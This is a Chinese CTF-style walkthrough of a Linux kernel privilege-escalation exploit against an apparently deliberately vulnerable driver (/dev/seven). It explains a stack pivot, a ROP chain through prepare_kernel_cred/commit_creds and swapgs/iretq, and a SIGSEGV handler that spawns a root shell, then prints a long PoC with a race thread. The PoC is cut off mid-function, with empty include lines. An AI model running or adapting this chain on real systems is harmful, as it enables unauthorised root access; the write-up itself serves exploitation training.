我们劫持的gadget要实现的功能是控制栈落在可控区域，这样我们就可以通过栈迁移，从而在事先布置好的ROP链上执行，因为当控制RIP时，RAX的值为此时gadget的地址，所以我们通过以下gadget控制栈
    xchg eax, esp; ret;
然后ROP链的功能就是提权+返回用户态
      u_int64_t hijacked_stack_addr = ((u_int64_t)xchg_eax_esp & 0xffffffff);
      printf("[+] hijacked_stack: %p\n", (char *)hijacked_stack_addr);
      char* fake_stack = NULL;
          //先装载页面
      if((fake_stack = mmap(
          (char*)((hijacked_stack_addr & (~0xfff))), // addr, 页对齐
          0x2000,                                 // length
          PROT_READ | PROT_WRITE,                 // prot
          MAP_PRIVATE | MAP_ANONYMOUS,            // flags
          -1,                                    // fd
          0) 
      ) == MAP_FAILED)
          perror("mmap");
      printf("[+]    fake_stack addr: %p\n", fake_stack);
      fake_stack[0]=0;
      u_int64_t* hijacked_stack_ptr = (u_int64_t*)hijacked_stack_addr;
      int index = 0;
      hijacked_stack_ptr[index++] = pop_rdi;
      hijacked_stack_ptr[index++] = 0;
      hijacked_stack_ptr[index++] = prepare_kernel_cred;
      hijacked_stack_ptr[index++] = mov_rdi_rax_je_pop_pop_ret;
      hijacked_stack_ptr[index++] = 0;
      hijacked_stack_ptr[index++] = 0;
      hijacked_stack_ptr[index++] = commit_creds;
      hijacked_stack_ptr[index++] = swapgs;
      hijacked_stack_ptr[index++] = iretq;
      hijacked_stack_ptr[index++] = (u_int64_t)getshell;
      hijacked_stack_ptr[index++] = user_cs;
      hijacked_stack_ptr[index++] = user_rflags;
      hijacked_stack_ptr[index++] = user_rsp;
      hijacked_stack_ptr[index++] = user_ss;
因为开启了kpti的缘故，所以我们实际上是通过在用户态注册 signal handler 来执行位于用户态的代码
    signal(SIGSEGV, getshell);
    void getshell()
    {
        if(getuid() == 0)
        {
            race_flag = 1;
            puts("[!] root![!] root![!] root![!] root![!] root![!] root![!] root![!] root![!] root!");
            system("/bin/sh");
        }
        else
        {
            puts("[!] failed!");
        }
    }
至此一个完整的提权过程完毕，以下是poc完整代码：
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include     
    u_int64_t KERNEL_BIN_BASE = 0xFFFFFFFF81000000;
    u_int64_t kernel_base;
    u_int64_t raw_kernel;
    u_int64_t pop_rdi;      // pop rdi; ret;
    u_int64_t mov_cr4_rdi;  // mov cr4, rdi; pop rbp; ret;
    u_int64_t prepare_kernel_cred;
    u_int64_t commit_creds;
    u_int64_t mov_rdi_rsi;            // mov qword ptr [rdi], rsi; ret;
    u_int64_t pop_rsi ;     // pop rsi;ret
    u_int64_t hook_prctl  ;
    u_int64_t poweroff_work_func;
    u_int64_t power_cmd ;
    u_int64_t mov_rdi_rax_je_pop_pop_ret; // mov rdi
    //0xffffffff819b5084: mov rdi, rax; je 0xbb508f; mov rax, rdi; pop rbx; pop rbp; ret;
    u_int64_t swapgs ;  // swagps;ret
    u_int64_t iretq ;
    u_int64_t test_rbx_jne_pop_pop_ret;
    long long int magic1;
    struct DATA
    {
        char* buf;
    };
    void add(int fd)
    {
        ioctl(fd, 0x5555, 0x80);
    }
    void delete(int fd)
    {
        ioctl(fd, 0x6666, 0);
    }
    void show(int fd)
    {
        ioctl(fd, 0x7777, 0);
    }
    u_int64_t user_cs, user_gs, user_ds, user_es, user_ss, user_rflags, user_rsp;
    void save_status()
    {
        __asm__ (".intel_syntax noprefix\n");
        __asm__ volatile (
            "mov user_cs, cs;\
             mov user_ss, ss;\
             mov user_gs, gs;\
             mov user_ds, ds;\
             mov user_es, es;\
             mov user_rsp, rsp;\
             pushf;\
             pop user_rflags"
        );
        printf("[+] got user stat\n");
    }
    u_int64_t raw_kernel;
    int race_flag = 0;
    void getshell()
    {
        if(getuid() == 0)
        {
            race_flag = 1;
            puts("[!] root![!] root![!] root![!] root![!] root![!] root![!] root![!] root![!] root!");
            system("/bin/sh");
        }
        else
        {
            puts("[!] failed!");
        }
    }
    static int fd = NULL;
    u_int64_t xchg_eax_esp = NULL;
    void *race(void *arg) {
      unsigned long *info = (unsigned long*)arg;
      info[0] = (u_int64_t)xchg_eax_esp; // cleanup
      // stack pivot
      u_int64_t hijacked_stack_addr = ((u_int64_t)xchg_eax_esp & 0xffffffff);
      printf("[+] hijacked_stack: %p\n", (char *)hijacked_stack_addr);
      char* fake_stack = NULL;
          //先装载页面
      if((fake_stack = mmap(
          (char*)((hijacked_stack_addr & (~0xfff))), // addr, 页对齐
          0x2000,                                 // length
          PROT_READ | PROT_WRITE,                 // prot
          MAP_PRIVATE | MAP_ANONYMOUS,            // flags
          -1,                                    // fd
          0) 
      ) == MAP_FAILED)
          perror("mmap");
      printf("[+]    fake_stack addr: %p\n", fake_stack);
      fake_stack[0]=0;
      u_int64_t* hijacked_stack_ptr = (u_int64_t*)hijacked_stack_addr;
      int index = 0;
      hijacked_stack_ptr[index++] = pop_rdi;
      hijacked_stack_ptr[index++] = 0;
      hijacked_stack_ptr[index++] = prepare_kernel_cred;
      hijacked_stack_ptr[index++] = mov_rdi_rax_je_pop_pop_ret;
      hijacked_stack_ptr[index++] = 0;
      hijacked_stack_ptr[index++] = 0;
      hijacked_stack_ptr[index++] = commit_creds;
      hijacked_stack_ptr[index++] = swapgs;
      hijacked_stack_ptr[index++] = iretq;
      hijacked_stack_ptr[index++] = (u_int64_t)getshell;
      hijacked_stack_ptr[index++] = user_cs;
      hijacked_stack_ptr[index++] = user_rflags;
      hijacked_stack_ptr[index++] = user_rsp;
      hijacked_stack_ptr[index++] = user_ss;
      while(1) {
        write(fd, (void*)info,0x20);
        if (race_flag) break;
      }
      return NULL;
    }
    int main()
    {
        // 0xffffffff81011cb0:xchg eax,esp
        u_int64_t kernel_addr,onegadget,target;
        signal(SIGSEGV, getshell);
        unsigned long buf[0x200];
        memset(buf, 0, 0x1000);
        fd = open("/dev/seven", O_RDWR);
        printf("fd: %d\n", fd);
        if (fd   
提取码：7777
供各位师傅复现